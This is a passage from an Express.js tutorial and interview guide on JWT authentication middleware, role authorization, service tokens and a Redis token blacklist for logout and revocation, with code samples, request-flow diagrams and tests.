app.delete('/api/users/:id', authenticate, (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(401).json({ error: 'Unauthorized' });  // ❌ WRONG!
  }
});
// User IS authenticated, but NOT authorized → 403, not 401!

// RIGHT:
app.delete('/api/users/:id', 
  authenticate,              // 401 if no/invalid token
  authorize('admin'),        // 403 if not admin
  deleteUserHandler
);
```

**Real Request Flow:**

```
Request: DELETE /api/users/123
Headers: Authorization: Bearer <valid-token-for-regular-user>

authenticate() middleware:
├─ Extract token ✅
├─ Verify signature ✅
├─ Check expiry ✅
├─ Attach req.user = { userId: 456, role: 'user' }
└─ next()

authorize('admin') middleware:
├─ Check req.user exists ✅
├─ Check req.user.role in ['admin']
├─ req.user.role = 'user'
├─ 'user' !== 'admin' ❌
└─ Return 403 Forbidden

User sees:
{
  "success": false,
  "error": {
    "message": "Insufficient permissions",
    "code": "FORBIDDEN",
    "required": ["admin"],
    "actual": "user"
  }
}
```

---

### Part 4: optionalAuth() Middleware

```javascript
async function optionalAuth(req, res, next) {
  try {
    // Try to authenticate
    const token = extractToken(req);
    
    if (!token) {
      // No token = guest user
      req.user = null;
      return next();
    }
    
    // Verify token
    const decoded = verifyToken(token, 'access');
    
    // Check blacklist
    const isBlacklisted = await blacklist.isBlacklisted(decoded.jti);
    
    if (isBlacklisted) {
      // Invalid token = treat as guest
      req.user = null;
      return next();
    }
    
    // Valid token = authenticated user
    req.user = {
      userId: decoded.userId,
      email: decoded.email,
      role: decoded.role,
      tokenId: decoded.jti
    };
    
    next();
    
  } catch (error) {
    // Any error = treat as guest (don't fail the request)
    req.user = null;
    next();
  }
}
```

**When to Use optionalAuth:**

```javascript
// Example 1: Product listing (works for everyone, but personalized for logged-in)
app.get('/api/products',
  optionalAuth,  // Try to authenticate, but don't require it
  async (req, res) => {
    const products = await getProducts();
    
    if (req.user) {
      // Logged in = show personalized recommendations
      const recommendations = await getRecommendations(req.user.userId);
      res.json({ products, recommendations });
    } else {
      // Guest = just show products
      res.json({ products });
    }
  }
);

// Example 2: Blog post (public, but show edit button if author)
app.get('/api/posts/:id',
  optionalAuth,
  async (req, res) => {
    const post = await getPost(req.params.id);
    
    const response = {
      ...post,
      canEdit: req.user && req.user.userId === post.authorId
    };
    
    res.json(response);
  }
);

// Example 3: Free vs premium content
app.get('/api/articles/:id',
  optionalAuth,
  async (req, res) => {
    const article = await getArticle(req.params.id);
    
    if (req.user && req.user.role === 'premium') {
      // Premium user = full article
      res.json(article);
    } else {
      // Guest or free user = preview only
      res.json({
        title: article.title,
        preview: article.content.substring(0, 500),
        requiresPremium: true
      });
    }
  }
);
```

**optionalAuth vs authenticate Comparison:**

```javascript
// WITH authenticate (required):
app.get('/api/profile', authenticate, handler);

Request without token:
└─ Response: 401 Unauthorized ❌

Request with invalid token:
└─ Response: 401 Unauthorized ❌

Request with valid token:
└─ Response: 200 OK ✅
    req.user = { userId: 123, ... }

// WITH optionalAuth:
app.get('/api/products', optionalAuth, handler);

Request without token:
└─ Response: 200 OK ✅
    req.user = null

Request with invalid token:
└─ Response: 200 OK ✅
    req.user = null (error ignored)

Request with valid token:
└─ Response: 200 OK ✅
    req.user = { userId: 123, ... }
```

---

### Part 5: Middleware Chains

**Order Matters!**

```javascript
// ✅ CORRECT ORDER:
app.delete('/api/users/:id',
  authenticate,           // 1. Check token exists and valid
  authorize('admin'),     // 2. Check user has admin role
  deleteUserHandler       // 3. Execute business logic
);

// ❌ WRONG ORDER:
app.delete('/api/users/:id',
  authorize('admin'),     // authorize checks req.user
  authenticate,           // but req.user not set yet!
  deleteUserHandler
);
// Result: authorize fails because req.user is undefined

// ❌ ALSO WRONG:
app.delete('/api/users/:id',
  authorize('admin'),     // No authenticate at all!
  deleteUserHandler
);
// Result: req.user is undefined, authorize fails
```

**Complex Example (Multiple Checks):**

```javascript
app.post('/api/orders',
  rateLimiter,              // 1. Check rate limit (prevent spam)
  authenticate,              // 2. Check token
  authorize('user', 'admin'), // 3. Check role
  validateOrderRequest,      // 4. Check request body
  async (req, res) => {
    // All checks passed!
    const order = await createOrder(req.user.userId, req.body);
    res.json(order);
  }
);

// Request flow:
Request arrives
    ↓
rateLimiter: Check if user exceeded rate limit
├─ Exceeded? Return 429 Too Many Requests
└─ OK? Continue
    ↓
authenticate: Check JWT token
├─ No token? Return 401
├─ Invalid? Return 401
└─ Valid? Continue
    ↓
authorize: Check role
├─ Not user/admin? Return 403
└─ Is user/admin? Continue
    ↓
validateOrderRequest: Check body
├─ Invalid data? Return 400
└─ Valid? Continue
    ↓
createOrder: Business logic
    ↓
Return 200 OK
```

---

### Part 6: Service-to-Service Authentication

```javascript
async function authenticateService(req, res, next) {
  try {
    // Extract token
    const token = extractToken(req);
    
    if (!token) {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Service token required',
          code: 'NO_SERVICE_TOKEN'
        }
      });
    }
    
    // Verify token
    const decoded = verifyToken(token, 'service');
    
    // Attach service info to request
    req.service = {
      serviceName: decoded.serviceName,
      permissions: decoded.permissions || []
    };
    
    next();
    
  } catch (error) {
    return res.status(401).json({
      success: false,
      error: {
        message: 'Invalid service token',
        code: 'INVALID_SERVICE_TOKEN'
      }
    });
  }
}

function authorizeService(...requiredPermissions) {
  return (req, res, next) => {
    if (!req.service) {
      return res.status(401).json({
        success: false,
        error: {
          message: 'Service authentication required',
          code: 'NOT_AUTHENTICATED'
        }
      });
    }
    
    // Check if service has all required permissions
    const hasAllPermissions = requiredPermissions.every(perm =>
      req.service.permissions.includes(perm)
    );
    
    if (!hasAllPermissions) {
      return res.status(403).json({
        success: false,
        error: {
          message: 'Insufficient service permissions',
          code: 'FORBIDDEN',
          required: requiredPermissions,
          actual: req.service.permissions
        }
      });
    }
    
    next();
  };
}
```

**Internal API Example:**

```javascript
// User Service - Internal API (service-to-service only)
app.get('/api/internal/users/:id',
  authenticateService,                    // Verify service token
  authorizeService('read:users'),         // Check permission
  async (req, res) => {
    const user = await getUserById(req.params.id);
    res.json(user);
  }
);

// Gateway calls User Service:
const serviceToken = generateServiceToken('api-gateway', ['read:users']);

const response = await axios.get(
  'http://user-service/api/internal/users/123',
  {
    headers: {
      'Authorization': `Bearer ${serviceToken}`
    }
  }
);
```

**Why Separate Service Auth?**

```
SCENARIO: Gateway needs to fetch user data

WITHOUT service tokens (using user's token):
Gateway receives user request
    ↓
User token: { userId: 123, role: 'user' }
    ↓
Gateway forwards user token to User Service
    ↓
User Service sees: "user with role 'user' accessing user 123"
    ↓
Audit log: "User 123 accessed their own data" ✅

But what if gateway needs user 456's data for comparison?
    ↓
Gateway forwards user 123's token
    ↓
User Service sees: "user 123 accessing user 456"
    ↓
Audit log: "User 123 accessed user 456's data" ❌ WRONG!
    ↓
OR authorization fails (user can't access other users)

WITH service tokens:
Gateway receives user request (user 123)
    ↓
Gateway generates service token
    ↓
Service token: { serviceName: 'api-gateway', permissions: ['read:users'] }
    ↓
Gateway calls User Service with service token
    ↓
User Service sees: "api-gateway accessing user data"
    ↓
Audit log: "api-gateway accessed user 456 for request by user 123" ✅
    ↓
Clear distinction: user made request, service fulfilled it
```

---

## Tutorial vs Production Comparison

### Tutorial Approach:

```javascript
// Duplicate auth logic everywhere
app.get('/api/profile', async (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const user = jwt.verify(token, SECRET);
    const profile = await getProfile(user.id);
    res.json(profile);
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

app.get('/api/orders', async (req, res) => {
  // Copy-paste same auth code... 😢
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const user = jwt.verify(token, SECRET);
    const orders = await getOrders(user.id);
    res.json(orders);
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// Problems:
// ❌ Code duplication (50+ routes = 50× auth code!)
// ❌ Easy to forget checks (security hole)
// ❌ Inconsistent error messages
// ❌ No blacklist checking
// ❌ No role checking
// ❌ Hard to add features (blacklist? Add to 50 places!)
```

### Production Approach:

```javascript
// Define middleware once
const { authenticate, authorize, optionalAuth } = require('./middleware');

// Use everywhere
app.get('/api/profile', authenticate, getProfileHandler);
app.get('/api/orders', authenticate, getOrdersHandler);
app.delete('/api/users/:id', authenticate, authorize('admin'), deleteUserHandler);
app.get('/api/products', optionalAuth, getProductsHandler);

// Benefits:
// ✅ Auth logic in ONE place
// ✅ Can't forget (TypeScript can enforce)
// ✅ Consistent errors
// ✅ Easy to add features (add once, applies everywhere)
// ✅ Easy to test (test middleware once)
// ✅ Clear separation of concerns
```

---

## Interview Questions

### Q1: "How do authentication middleware work in Express?"

**Perfect Answer:**

"Authentication middleware intercepts requests before they reach route handlers, validates credentials, and attaches user context to the request object.

**Flow:**
1. Extract token from Authorization header
2. Verify signature using public key (RS256)
3. Check token hasn't expired
4. Query blacklist (Redis) for revoked tokens
5. Attach user info to req.user
6. Call next() to continue to route handler

**Key aspects:**

**Placement:** Must come BEFORE route handler in middleware chain. Order: rateLimiter → authenticate → authorize → handler.

**Error handling:** Don't call next(error) for auth failures - handle directly with 401/403 response. Only pass unexpected errors to error handler.

**Performance:** Blacklist check adds Redis query (~2-5ms). For high-traffic APIs, I'd use a local cache with 1-second TTL to reduce Redis load, or skip for non-critical endpoints.

**Stateless with exception:** Token verification is stateless (no database), but blacklist check isn't. This is acceptable trade-off - 99% of requests don't check blacklist (no logout), so we maintain mostly-stateless benefits.

In production, I wrap token verification in try/catch with specific error codes (TOKEN_EXPIRED, INVALID_TOKEN, TOKEN_REVOKED) so clients can handle each case appropriately."

---

### Q2: "What's the difference between authentication and authorization?"

**Perfect Answer:**

"Authentication is WHO you are, authorization is WHAT you can do.

**Authentication:**
- Verifies identity: 'Is this token valid?'
- Checks: Signature, expiry, blacklist
- Result: 401 Unauthorized if fails
- Middleware: authenticate()
- Example: 'Prove you are user 123'

**Authorization:**
- Verifies permissions: 'Can this user do this?'
- Checks: Role, permissions, ownership
- Result: 403 Forbidden if fails
- Middleware: authorize('admin')
- Example: 'Is user 123 an admin?'

**Why separate middleware?**

```javascript
// Can have authentication without authorization:
app.get('/api/profile', authenticate, handler);
// Any authenticated user can access

// Can't have authorization without authentication:
app.delete('/api/users/:id', authorize('admin'), handler);  // ❌ WRONG
// authorize needs req.user, but authenticate not called yet

// Correct order:
app.delete('/api/users/:id', authenticate, authorize('admin'), handler);
```

**HTTP Status Codes:**
- 401: You're not logged in / token invalid
- 403: You're logged in but don't have permission

**Example scenario:**
Regular user tries to DELETE /api/users/456:
- authenticate: ✅ Token valid, user 123 authenticated
- authorize('admin'): ❌ User 123 is 'user', not 'admin'
- Response: 403 Forbidden (not 401, because they ARE authenticated)"

---

### Q3: "How do you handle token refresh in middleware?"

**Perfect Answer:**

"I don't handle refresh in authentication middleware - that's a separate endpoint flow. Here's why:

**Authentication middleware responsibility:**
- Verify access token
- If expired: Return 401 with TOKEN_EXPIRED code
- If valid: Attach user to req.user

**Refresh responsibility (separate endpoint):**
- Client detects 401 TOKEN_EXPIRED
- Client calls POST /api/auth/refresh with refresh token
- Server issues new access + refresh tokens
- Client retries original request with new token

**Why separate?**

If middleware auto-refreshed tokens:
```javascript
// BAD: Auto-refresh in middleware
async function authenticate(req, res, next) {
  let token = extractToken(req);
  try {
    req.user = verifyToken(token);
    next();
  } catch (error) {
    if (error.message === 'Token expired') {
      // Auto-refresh logic here...
      const newToken = await refreshToken(token);  // ❌ WRONG!
      res.setHeader('X-New-Token', newToken);
      req.user = verifyToken(newToken);
      next();
    }
  }
}
```

Problems:
1. Middleware shouldn't fetch refresh token (where is it? cookie? body?)
2. Response header not reliable for new token
3. Adds latency to every expired request
4. Complex error handling
5. Violates single responsibility

**Correct flow:**
```javascript
// Client side (pseudo-code):
async function apiCall(url) {
  let response = await fetch(url, {
    headers: { Authorization: `Bearer ${accessToken}` }
  });
  
  if (response.status === 401 && response.error.code === 'TOKEN_EXPIRED') {
    // Refresh tokens
    const newTokens = await fetch('/api/auth/refresh', {
      headers: { Authorization: `Bearer ${refreshToken}` }
    });
    
    // Update stored tokens
    accessToken = newTokens.accessToken;
    refreshToken = newTokens.refreshToken;
    
    // Retry original request
    response = await fetch(url, {
      headers: { Authorization: `Bearer ${accessToken}` }
    });
  }
  
  return response;
}
```

This keeps middleware simple and gives client control over refresh timing."

---

### Q4: "How do you implement optional authentication?"

**Perfect Answer:**

"Optional authentication tries to authenticate but doesn't fail the request if authentication fails - treats failures as anonymous users.

**Implementation:**

```javascript
async function optionalAuth(req, res, next) {
  try {
    const token = extractToken(req);
    if (!token) {
      req.user = null;  // Guest user
      return next();
    }
    
    const decoded = verifyToken(token);
    const isBlacklisted = await blacklist.check(decoded.jti);
    
    if (isBlacklisted) {
      req.user = null;  // Treat as guest
      return next();
    }
    
    req.user = decoded;  // Authenticated user
    next();
  } catch (error) {
    req.user = null;  // Any error = guest
    next();
  }
}
```

**Key differences from required auth:**

1. **No early returns with errors** - all paths call next()
2. **Set req.user = null for guest** - handler can check if (req.user)
3. **Catch all errors** - don't let auth errors fail the request

**Use cases:**

```javascript
// Product listing: public but personalized for logged-in
app.get('/api/products', optionalAuth, (req, res) => {
  const products = await getProducts();
  if (req.user) {
    products.forEach(p => p.recommended = checkRecommendation(req.user.id, p));
  }
  res.json(products);
});

// Blog post: show edit button only for author
app.get('/api/posts/:id', optionalAuth, (req, res) => {
  const post = await getPost(req.params.id);
  post.canEdit = req.user && req.user.userId === post.authorId;
  res.json(post);
});
```

**Security consideration:** Don't use optionalAuth for endpoints that expose sensitive data by default. If endpoint needs auth to be secure, use required auth and return 401. Optional auth is for enhancing experience, not protecting data."

---

### Q5: "How do you test authentication middleware?"

**Perfect Answer:**

"I test authentication middleware in isolation using supertest, mocking dependencies like Redis and JWT verification.

**Test structure:**

```javascript
const request = require('supertest');
const express = require('express');
const { authenticate } = require('./middleware');

// Mock dependencies
jest.mock('./jwt', () => ({
  verifyToken: jest.fn()
}));
jest.mock('./blacklist', () => ({
  isBlacklisted: jest.fn()
}));

describe('authenticate middleware', () => {
  let app;
  
  beforeEach(() => {
    app = express();
    app.get('/test', authenticate, (req, res) => {
      res.json({ user: req.user });
    });
  });
  
  test('accepts valid token', async () => {
    verifyToken.mockReturnValue({ userId: 123, role: 'user' });
    blacklist.isBlacklisted.mockResolvedValue(false);
    
    const response = await request(app)
      .get('/test')
      .set('Authorization', 'Bearer valid-token');
    
    expect(response.status).toBe(200);
    expect(response.body.user.userId).toBe(123);
  });
  
  test('rejects missing token', async () => {
    const response = await request(app).get('/test');
    
    expect(response.status).toBe(401);
    expect(response.body.error.code).toBe('NO_TOKEN');
  });
  
  test('rejects blacklisted token', async () => {
    verifyToken.mockReturnValue({ userId: 123, jti: 'abc' });
    blacklist.isBlacklisted.mockResolvedValue(true);
    
    const response = await request(app)
      .get('/test')
      .set('Authorization', 'Bearer blacklisted-token');
    
    expect(response.status).toBe(401);
    expect(response.body.error.code).toBe('TOKEN_REVOKED');
  });
  
  test('rejects expired token', async () => {
    verifyToken.mockImplementation(() => {
      throw new Error('Token expired');
    });
    
    const response = await request(app)
      .get('/test')
      .set('Authorization', 'Bearer expired-token');
    
    expect(response.status).toBe(401);
    expect(response.body.error.code).toBe('TOKEN_EXPIRED');
  });
});
```

**Integration tests:**

```javascript
// Test with real JWT tokens (not mocked)
describe('authenticate integration', () => {
  test('full authentication flow', async () => {
    // Generate real token
    const token = generateAccessToken({ userId: 123 });
    
    // Make real request
    const response = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${token}`);
    
    expect(response.status).toBe(200);
  });
});
```

**Coverage targets:**
- Valid token: 200 OK
- No token: 401 NO_TOKEN
- Invalid format: 401 INVALID_TOKEN
- Expired token: 401 TOKEN_EXPIRED
- Blacklisted: 401 TOKEN_REVOKED
- Wrong token type: 401 INVALID_TOKEN_TYPE

I also test middleware chain order to ensure authorize() fails gracefully when authenticate() not called first."

---

---

# 🔥 COMPONENT 3: Token Blacklist (Revocation)

**File:** `shared/auth/blacklist.js`

## The Problem (Can't Revoke JWTs!)

**JWT's Biggest Weakness:**

```
JWT = Stateless = Self-contained = Can't be revoked!

User logs in:
├─ Access token: Valid until 2:15 PM (15 min)
└─ Server has NO RECORD of this token (stateless!)

User clicks "Logout" at 2:05 PM:
├─ What should happen: Token immediately invalid ✅
└─ What actually happens: Token valid until 2:15 PM ❌

Attacker steals token at 2:10 PM:
├─ User reports: "Someone accessed my account!"
├─ Admin clicks "Revoke all tokens"
├─ What should happen: All tokens immediately invalid ✅
└─ What actually happens: Tokens valid until expiry ❌

This is a HUGE problem! 💀
```

**Real-World Scenario:**

```
Monday 9:00 AM: Employee logs in at office
├─ Token issued, valid until 5:00 PM
└─ Employee working normally

Monday 11:00 AM: Employee fired!
├─ HR: "Revoke access immediately"
├─ Admin revokes account in database
└─ BUT: Token still valid until 5:00 PM!

Monday 11:01 AM - 5:00 PM: Ex-employee still has access!
├─ Downloads confidential data
├─ Deletes files
├─ Changes configurations
└─ 6 hours of unauthorized access! 💀

Cost: Data breach, legal issues, reputation damage
```

---

## The Solution: Token Blacklist

**Add Blacklist Check to Middleware:**

```
Token verification flow (WITHOUT blacklist):
1. Verify signature ✅
2. Check expiry ✅
3. Accept token → Continue to handler

Token verification flow (WITH blacklist):
1. Verify signature ✅
2. Check expiry ✅
3. Check if token in blacklist ← NEW!
   ├─ In blacklist? Reject ❌
   └─ Not in blacklist? Accept ✅
4. Continue to handler
```

**How It Works:**

```
User logout:
├─ Extract jti from token: "550e8400-e29b-41d4-a716-446655440000"
├─ Add to Redis: SET blacklist:550e8400-e29b... "revoked" EX 900
│  └─ EX 900 = Expire after 900 seconds (15 minutes = token lifetime)
└─ Token now blacklisted!

Next request with same token:
├─ Extract jti: "550e8400-..."
├─ Check Redis: GET blacklist:550e8400-...
├─ Result: "revoked"
└─ Reject request with 401 TOKEN_REVOKED ✅

After 15 minutes:
├─ Redis key expires (TTL = 0)
├─ Blacklist check: GET blacklist:550e8400-... → null
├─ But token also expired naturally (15 min expiry)
└─ No memory leak! ✅
```

---

## Complete Code Walkthrough

### Part 1: Redis Setup

```javascript
const redis = require('redis');

// Create Redis client
const redisClient = redis.createClient({
  host: process.env.REDIS_HOST || 'localhost',
  port: process.env.REDIS_PORT || 6379,
  password: process.env.REDIS_PASSWORD,
  
  // Retry strategy
  retry_strategy: (options) => {
    if (options.error && options.error.code === 'ECONNREFUSED') {
      console.error('Redis connection refused');
      return new Error('Redis unavailable');
    }
    
    if (options.total_retry_time > 1000 * 60 * 60) {
      return new Error('Redis retry time exhausted');
    }
    
    if (options.attempt > 10) {
      return undefined; // Stop retrying
    }
    
    // Retry after
    return Math.min(options.attempt * 100, 3000);
  }
});

// Connection events
redisClient.on('connect', () => {
  console.log('Redis connected');
});

redisClient.on('error', (err) => {
  console.error('Redis error:', err);
});
```

**Why Redis for Blacklist?**

```
OPTION 1: In-Memory JavaScript Object ❌
const blacklist = {};
blacklist[tokenId] = true;

Problems:
├─ Lost on server restart
├─ Not shared across multiple gateway instances
├─ Memory grows forever (no TTL)
└─ Gateway 1 blacklists token, Gateway 2 accepts it!

OPTION 2: Database (PostgreSQL) ❌
INSERT INTO blacklist (token_id, expires_at) VALUES (...);

Problems:
├─ 10-50ms query latency (vs Redis 1-2ms)
├─ Adds load to database
├─ Need background job to clean up expired tokens
└─ Overkill for temporary data

OPTION 3: Redis ✅
SET blacklist:550e8400-... "revoked" EX 900

Benefits:
├─ 1-2ms query latency (fast!)
├─ Shared across all gateway instances
├─ Auto-expiry with TTL (no cleanup needed)
├─ Designed for this use case
└─ Perfect fit! ✅
```

---

### Part 2: Add to Blacklist

```javascript
async function addToBlacklist(tokenId, expiresIn) {
  if (!tokenId) {
    throw new Error('Token ID required');
  }
  
  if (!expiresIn || expiresIn <= 0) {
    throw new Error('Invalid expiry time');
  }
  
  try {
    // Add to Redis with TTL
    const key = `blacklist:${tokenId}`;
    await redisClient.setEx(key, expiresIn, 'revoked');
    
    console.log(`Token ${tokenId} blacklisted for ${expiresIn}s`);
    
    return true;
  } catch (error) {
    console.error('Failed to blacklist token:', error);
    throw error;
  }
}
```

**How to Calculate expiresIn:**

```javascript
// When logging out:
const token = extractToken(req);
const decoded = verifyToken(token);

// Token payload has:
// exp: 1627846500 (expiry timestamp in seconds)
// Current time: Math.floor(Date.now() / 1000)

const now = Math.floor(Date.now() / 1000);
const expiresIn = decoded.exp - now;

// Example:
// Token exp: 1627846500 (2:15 PM)
// Current: 1627846200 (2:10 PM)
// expiresIn: 1627846500 - 1627846200 = 300 seconds (5 minutes)

await addToBlacklist(decoded.jti, expiresIn);

// Redis: SET blacklist:550e8400-... "revoked" EX 300
// After 300 seconds (5 minutes), Redis automatically deletes key ✅
```

**Why TTL Matches Token Expiry:**

```
Token expires at: 2:15 PM
Blacklist TTL: 5 minutes (expires at 2:15 PM)

At 2:15 PM:
├─ Token naturally expired (JWT exp claim)
├─ Blacklist entry also expired (Redis TTL)
└─ Both gone! No memory leak ✅

If TTL was longer (e.g., 1 day):
├─ Token expired at 2:15 PM
├─ Blacklist entry expires at 2:15 PM next day
├─ Redis stores useless data for 23 hours 45 minutes
└─ Waste of memory ❌

If TTL was shorter (e.g., 1 minute):
├─ Blacklist expires at 2:11 PM
├─ Token still valid until 2:15 PM
├─ Between 2:11-2:15 PM: Token NOT in blacklist!
├─ Revoked token can be used! 💀
└─ Security hole! ❌

TTL = Token remaining lifetime is perfect! ✅
```

---

### Part 3: Check Blacklist

```javascript
async function isBlacklisted(tokenId) {
  if (!tokenId) {
    return false; // No token ID = not blacklisted (fail open)
  }
  
  try {
    const key = `blacklist:${tokenId}`;
    const result = await redisClient.get(key);
    
    // If key exists, token is blacklisted
    return result !== null;
    
  } catch (error) {
    console.error('Failed to check blacklist:', error);
    
    // CRITICAL DECISION: What to do on Redis error?
    
    // Option 1: Fail closed (reject all tokens)
    // return true;  // Assume blacklisted = no access if Redis down
    
    // Option 2: Fail open (accept all tokens)
    return false;  // Assume not blacklisted = maintain availability
    
    // Trade-off: Security vs Availability
    // We choose availability (fail open) because:
    // 1. Short token expiry (15 min) limits damage
    // 2. Redis downtime should be rare and short
    // 3. Complete auth failure worse than temporary security gap
  }
}
```

**Fail Open vs Fail Closed:**

```
SCENARIO: Redis is down (network issue, server restart, etc.)

FAIL CLOSED (return true on error):
├─ isBlacklisted() returns true for ALL tokens
├─ ALL requests rejected with 401 TOKEN_REVOKED
├─ NO users can access the system
└─ Complete outage! ❌

FAIL OPEN (return false on error):
├─ isBlacklisted() returns false for ALL tokens
├─ Revoked tokens temporarily accepted
├─ Users can still access the system
└─ System remains available ✅

Which is better?

It depends on your security requirements:

HIGH SECURITY (banking, healthcare):
└─ Fail closed: Better to lock everyone out than risk one bad actor

NORMAL SECURITY (most apps):
└─ Fail open: Short token expiry (15 min) limits damage
           Redis outage should be brief
           User experience matters

We choose FAIL OPEN because:
1. Tokens expire in 15 minutes anyway
2. Redis highly available (99.9%+)
3. Complete auth failure unacceptable
4. Can monitor Redis health and alert
```

**Performance Optimization:**

```javascript
// BASIC VERSION (query Redis every time):
async function isBlacklisted(tokenId) {
  const result = await redisClient.get(`blacklist:${tokenId}`);
  return result !== null;
}

// At 1000 req/s: 1000 Redis queries/s
// Latency: 2ms per query
// Total: 2000ms/s of Redis overhead

// OPTIMIZED VERSION (with local cache):
const localCache = new Map();
const CACHE_TTL = 1000; // 1 second

async function isBlacklisted(tokenId) {
  // Check local cache first
  const cached = localCache.get(tokenId);
  
  if (cached && Date.now() < cached.expiresAt) {
    return cached.value;
  }
  
  // Cache miss - query Redis
  const result = await redisClient.get(`blacklist:${tokenId}`);
  const isBlacklisted = result !== null;
  
  // Store in cache
  localCache.set(tokenId, {
    value: isBlacklisted,
    expiresAt: Date.now() + CACHE_TTL
  });
  
  return isBlacklisted;
}

// At 1000 req/s with same tokens:
// First request: Redis query
// Next 999 requests in 1 second: Cache hit
// Total: 1 Redis query/s (vs 1000!)
// 99.9% reduction in Redis load! 🚀

// Trade-off:
// Token revoked at 2:10:00.000
// Cache entry expires at 2:10:01.000
// Between 2:10:00-2:10:01: Token accepted (1 second window)
// Acceptable for most use cases ✅
```

---

### Part 4: Remove from Blacklist (Edge Case)

```javascript
async function removeFromBlacklist(tokenId) {
  if (!tokenId) {
    return false;
  }
  
  try {
    const key = `blacklist:${tokenId}`;
    const result = await redisClient.del(key);
    
    return result === 1; // 1 = key was deleted, 0 = key didn't exist
    
  } catch (error) {
    console.error('Failed to remove from blacklist:', error);
    return false;
  }
}
```

**When to Use:**

```javascript
// Rare case: User accidentally logged out, wants back in

User clicks "Logout" by mistake:
├─ Token blacklisted
└─ User: "Wait, I didn't mean to logout!"

Admin can un-revoke token:
├─ await removeFromBlacklist(tokenId)
├─ Token removed from blacklist
└─ User's existing token works again ✅

// Another case: Testing/debugging
await addToBlacklist(tokenId, 300);
// ... test logout flow ...
await removeFromBlacklist(tokenId);
// Clean up test data
```

---

### Part 5: Blacklist All User Tokens

```javascript
async function blacklistAllUserTokens(userId, allUserTokens) {
  if (!userId || !Array.isArray(allUserTokens)) {
    throw new Error('User ID and token list required');
  }
  
  const promises = allUserTokens.map(token => {
    const now = Math.floor(Date.now() / 1000);
    const expiresIn = Math.max(token.exp - now, 0);
    
    if (expiresIn > 0) {
      return addToBlacklist(token.jti, expiresIn);
    }
    return Promise.resolve(); // Already expired
  });
  
  await Promise.all(promises);
  
  console.log(`Blacklisted ${promises.length} tokens for user ${userId}`);
}
```

**Use Cases:**

```javascript
// CASE 1: Security breach
User reports: "Someone accessed my account!"
    ↓
Admin: "Revoke ALL user's tokens"
    ↓
1. Get all user's refresh tokens from database
2. For each token, extract access token it granted
3. Blacklist all tokens (access + refresh)
    ↓
Attacker's token immediately invalid ✅

// CASE 2: Password change
User changes password:
    ↓
Security best practice: Invalidate all existing sessions
    ↓
1. Blacklist all tokens
2. User must re-login with new password
    ↓
Even if attacker had token, now invalid ✅

// CASE 3: Role change
Admin changes user role from "user" to "admin":
    ↓
Problem: Old tokens still have role: "user"
    ↓
1. Blacklist all tokens
2. User re-logs in, gets new token with role: "admin"
    ↓
Tokens reflect current permissions ✅
```

---

### Part 6: Cleanup (Bonus - Usually Not Needed)

```javascript
async function cleanupExpiredBlacklist() {
  // Redis automatically deletes expired keys (TTL)
  // This function only needed if storing blacklist in database
  
  // For completeness:
  try {
    const keys = await redisClient.keys('blacklist:*');
    
    let cleaned = 0;
    for (const key of keys) {
      const ttl = await redisClient.ttl(key);
      
      if (ttl === -1) {
        // Key has no expiry (shouldn't happen, but just in case)
        await redisClient.del(key);
        cleaned++;
      }
    }
    
    console.log(`Cleaned ${cleaned} blacklist entries without TTL`);
    
  } catch (error) {
    console.error('Failed to cleanup blacklist:', error);
  }
}

// Run daily (just in case)
setInterval(cleanupExpiredBlacklist, 24 * 60 * 60 * 1000);
```

**Why Usually Not Needed:**

```
Redis TTL handles cleanup automatically:

SET blacklist:abc "revoked" EX 900
    ↓
After 900 seconds: Key automatically deleted
    ↓
GET blacklist:abc → null
    ↓
No manual cleanup needed! ✅

Cleanup only needed if:
1. Storing in database (no auto-expiry)
2. Redis keys created without TTL (bug)
3. Manual blacklist entries for testing
```

---

## Integration with Auth Flow

### Logout Flow (Complete):

```javascript
// POST /api/auth/logout
async function logout(req, res) {
  try {
    // 1. Extract tokens
    const accessToken = extractToken(req);
    const refreshToken = req.body.refreshToken;
    
    // 2. Verify and decode access token
    const decoded = verifyToken(accessToken, 'access');
    
    // 3. Calculate time until expiry
    const now = Math.floor(Date.now() / 1000);
    const expiresIn = decoded.exp - now;
    
    // 4. Blacklist access token
    if (expiresIn > 0) {
      await blacklist.addToBlacklist(decoded.jti, expiresIn);
    }
    
    // 5. Delete refresh token from database
    if (refreshToken) {
      await db.query(
        'DELETE FROM refresh_tokens WHERE token_hash = $1',
        [hashToken(refreshToken)]
      );
    }
    
    // 6. Return success
    res.json({
      success: true,
      message: 'Logged out successfully'
    });
    
  } catch (error) {
    // Even if blacklist fails, delete refresh token
    // At least user can't get new access tokens
    res.status(500).json({
      success: false,
      error: 'Logout failed'
    });
  }
}
```

**Flow Visualization:**

```
User clicks "Logout"
    ↓
POST /api/auth/logout
Headers: Authorization: Bearer <access-token>
Body: { refreshToken: "<refresh-token>" }
    ↓
Server:
1. Extract access token from header
2. Decode: jti = "550e8400-...", exp = 1627846500
3. Calculate: expiresIn = 900 seconds (15 min)
4. Redis: SET blacklist:550e8400-... "revoked" EX 900 ✅
5. Database: DELETE FROM refresh_tokens WHERE ... ✅
    ↓
Response: { success: true }
    ↓
User's next request:
Headers: Authorization: Bearer <same-access-token>
    ↓
authenticate() middleware:
1. Verify token signature ✅
2. Check expiry ✅
3. Check blacklist:
   ├─ Redis: GET blacklist:550e8400-...
   ├─ Result: "revoked"
   └─ Return 401 TOKEN_REVOKED ❌
    ↓
User must re-login ✅
```

---

## Tutorial vs Production Comparison

### Tutorial Approach:

```javascript
// No blacklist - logout does nothing!
app.post('/api/auth/logout', (req, res) => {
  res.json({ message: 'Logged out' });
});

// Problem:
User clicks "Logout"
    ↓
Server: "OK, logged out" (but does nothing!)
    ↓
User's token still valid for 15 minutes!
    ↓
If attacker has token: Still works! 💀

// Some tutorials store JWT in database:
app.post('/api/auth/login', async (req, res) => {
  const token = jwt.sign(user, SECRET);
  
  // Store in database ❌
  await db.query('INSERT INTO tokens (user_id, token) VALUES (?, ?)', 
    [user.id, token]);
  
  res.json({ token });
});

app.use(async (req, res, next) => {
  const token = extractToken(req);
  const decoded = jwt.verify(token, SECRET);
  
  // Check database for every request ❌
